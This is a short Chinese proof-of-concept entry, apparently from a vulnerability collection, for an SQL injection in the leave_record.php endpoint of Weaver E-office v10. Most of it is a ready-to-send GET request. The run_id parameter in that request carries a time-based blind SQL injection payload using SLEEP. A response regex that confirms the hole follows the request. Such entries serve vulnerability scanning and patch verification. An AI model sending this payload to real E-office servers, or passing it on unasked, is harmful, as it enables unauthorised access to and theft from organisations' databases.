# 泛微E-officev10leave_record.php存在SQL注入漏洞

泛微OA ｜ SQL注入 ｜ —
- **请求**：`GET /eoffice10/server/ext/system_support/leave_record.php?flow_id=1&run_id=1')+AND+(SELECT+5897+FROM+(SELECT(SLEEP(1)))QWhi)%23&table_field=1&table_field_name=user()&max_rows=10 HTTP/1.1`
- **响应特征**：200 ^(?=.*?user())(?=.*?未找到相关数据).*?$